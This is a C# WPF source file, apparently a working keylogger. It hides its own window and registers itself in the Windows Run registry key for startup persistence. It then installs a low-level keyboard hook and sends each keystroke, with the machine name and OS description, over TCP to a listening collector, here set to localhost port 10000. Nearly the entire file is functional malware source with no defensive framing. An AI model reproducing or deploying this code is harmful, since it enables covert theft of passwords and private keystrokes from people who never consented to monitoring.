using System;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Net.Sockets;
using System.IO;
using System.Net;
using Microsoft.Win32;
using System.Windows;
using KeyLogger;

namespace KeyLoggerWpf
{
    /// <summary>
    /// Логика взаимодействия для MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;

        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        static StreamWriter writer;
        static TcpClient tcpclient;

       
        public MainWindow()
        {
            InitializeComponent();
            this.Visibility = Visibility.Hidden;
           
            string ExePath = AppDomain.CurrentDomain.BaseDirectory;
            string name = "KeyLogger";
            RegistryKey reg;
            reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
            reg.SetValue(name, ExePath);
                     
            tcpclient = new TcpClient(AddressFamily.InterNetwork);
            tcpclient.Connect(IPAddress.Parse("127.0.0.1"), 10000);
            writer = new StreamWriter(tcpclient.GetStream());

            _hookID = SetHook(_proc);

            Closed += MainWindow_Closed;
        }

        private void MainWindow_Closed(object sender, EventArgs e)
        {
            UnhookWindowsHookEx(_hookID);
        }
        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(
            int nCode, IntPtr wParam, IntPtr lParam);
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
               
                var p = $"{Convert.ToInt32(PackageType.Send)};{(Keys)vkCode};{Environment.MachineName};{Convert.ToString(System.Runtime.InteropServices.RuntimeInformation.OSDescription)}";

                writer.WriteAsync(p);
                writer.FlushAsync();
            }

            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
    }
}
